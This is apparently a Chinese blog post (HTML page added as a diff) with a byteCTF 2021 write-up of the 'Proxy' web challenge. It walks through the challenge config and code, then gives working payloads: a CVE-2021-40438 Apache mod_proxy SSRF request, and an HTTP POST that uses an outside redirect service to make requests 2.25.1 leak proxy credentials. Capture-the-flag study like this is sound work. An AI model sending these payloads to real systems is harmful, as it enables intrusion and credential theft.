@@ -1,0 +1,384 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>byteCTF部分Web题目复现 - Welcome to fallingblog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="Proxy代码审计在httpd.conf文件中可以看到...">
+  <meta name="author" content="Ibukifalling">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'http://qungz.photo.store.qq.com/qun-qungz/V529aeGH0GBCCT3kuwad344GhY0Vrm5T/V5bCgAxMDkwNzMxNjgyksC6Yb7uuDg!/800?w5=902&amp;h5=1028&amp;rf=viewer_421',
+        wechat: 'http://qungz.photo.store.qq.com/qun-qungz/V529aeGH0GBCCT3kuwad344GhY0Vrm5T/V5bCgAxMDkwNzMxNjgyk8C6YYUouDg!/800?w5=1066&amp;h5=1021&amp;rf=viewer_421'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">byteCTF部分Web题目复现</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">byteCTF部分Web题目复现</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 19, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2567</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>在<code>httpd.conf</code>文件中可以看到代理配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">ServerName bytectf<br><br>Listen 8123<br><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> &quot;*<span class="hljs-attr">:8123</span>&quot;&gt;</span><br>    ProxyRequests On<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Proxy</span> &quot;*&quot;&gt;</span><br>        AuthType Basic<br>        AuthName &quot;Only For Internal Use, Password Required&quot;<br>        AuthUserFile password.file<br>        AuthGroupFile group.file<br>        Require group usergroup<br>        Require host web<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">VirtualHost</span>&gt;</span><br><br>Listen 80<br><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> &quot;*<span class="hljs-attr">:80</span>&quot;&gt;</span><br>    ProxyPass &quot;/&quot; &quot;http://website/&quot; disablereuse=On<br><span class="hljs-tag">&lt;/<span class="hljs-name">VirtualHost</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>8123为代理端口，80端口（也就是我们能访问的端口）的请求转发到website页面</p>
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219132111882.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>该页面是个纯前端文件</p>
+<p>那么我们继续看internal部分的app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template<br><span class="hljs-keyword">import</span> requests, os<br><br>PROXY_USER = os.getenv(<span class="hljs-string">&#x27;CHALL_PROXY_USER&#x27;</span>)<br>PROXY_PASS = os.getenv(<span class="hljs-string">&#x27;CHALL_PROXY_PASS&#x27;</span>)<br>PROXIES = &#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;PROXY_USER&#125;</span>:<span class="hljs-subst">&#123;PROXY_PASS&#125;</span>@proxy:8123&#x27;</span>, <span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;PROXY_USER&#125;</span>:<span class="hljs-subst">&#123;PROXY_PASS&#125;</span>@proxy:8123&#x27;</span>&#125;<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/fetch&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fetch</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.form[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Please provide url&#x27;</span><br>    app.logger.info(request.form[<span class="hljs-string">&#x27;url&#x27;</span>])<br><br>    <span class="hljs-keyword">try</span>:<br>        resp = requests.get(request.form[<span class="hljs-string">&#x27;url&#x27;</span>], timeout=<span class="hljs-number">5</span>, proxies=PROXIES)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&#x27;Error: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Error&#x27;</span><br><br>    <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> resp.text<br>    <span class="hljs-keyword">else</span>:<br>        app.logger.warning(<span class="hljs-string">f&#x27;Error: status <span class="hljs-subst">&#123;resp.status_code&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Error&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure>
+
+<p>可以通过fetch路由发出代理请求</p>
+<h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><p>注意到本题的proxypass就是flag</p>
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219132426722.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>所以本题的大致解题思路梳理如下</p>
+<p>通过SSRF访问到app.py的路由–&gt;通过app.py发出一个向外的请求–&gt;通过某种方式带出proxypass</p>
+<p>（当然，赛后梳理思路属于是射箭画靶的行为，比赛尝试了各种手段后才梳理到这条思路，最后也没做出来）</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>代理服务器为Apache 2.4.48</p>
+<p>直接google开搜，可以找到apache mod_proxy SSRF，适用版本 &lt;=2.4.48</p>
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219133936145.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>CVE-2021-40438，该漏洞的具体成因可以参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">这篇文章</a></p>
+<p>可以通过如下payload进行SSRF访问到internal页面</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/?unix:AAAAAAA……AA|http:/</span><span class="hljs-regexp">/internal/</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="带出代理密码"><a href="#带出代理密码" class="headerlink" title="带出代理密码"></a>带出代理密码</h3><p>注意到题目给出的附件中特意指定了python的requests版本为2.25.1</p>
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219221539125.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>Python requests库2.25.1及以下版本在处理302跳转时会带着proxy验证头</p>
+<p>原因分析：<a target="_blank" rel="noopener" href="https://github.com/psf/requests/issues/5677">https://github.com/psf/requests/issues/5677</a></p>
+<p>payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/unix:AAAA...AAA|http://internal/fetch</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.95.118.231:30888<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="awk">url=https:<span class="hljs-regexp">//</span>httpbingo.org<span class="hljs-regexp">/redirect-to?url=https:/</span><span class="hljs-regexp">/httpbingo.org/</span>headers</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219224512174.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/images/byteCTF2021/image-20211219224527667.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+
+      </section>
+      <section class="extra">
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="http://qungz.photo.store.qq.com/qun-qungz/V529aeGH0GBCCT3kuwad344GhY0Vrm5T/V5bCgAxMDkwNzMxNjgyksC6Yb7uuDg!/800?w5=902&h5=1028&rf=viewer_421" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/byteCTF/" rel="tag">byteCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/12/16/ecshop2.7.3sqli/">ECshop 2.7.3 SQL注入漏洞分析<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Proxy"><span class="toc-text">Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86"><span class="toc-text">思路整理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%87%BA%E4%BB%A3%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-text">带出代理密码</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=3067733270 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="mailto:3067733270@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
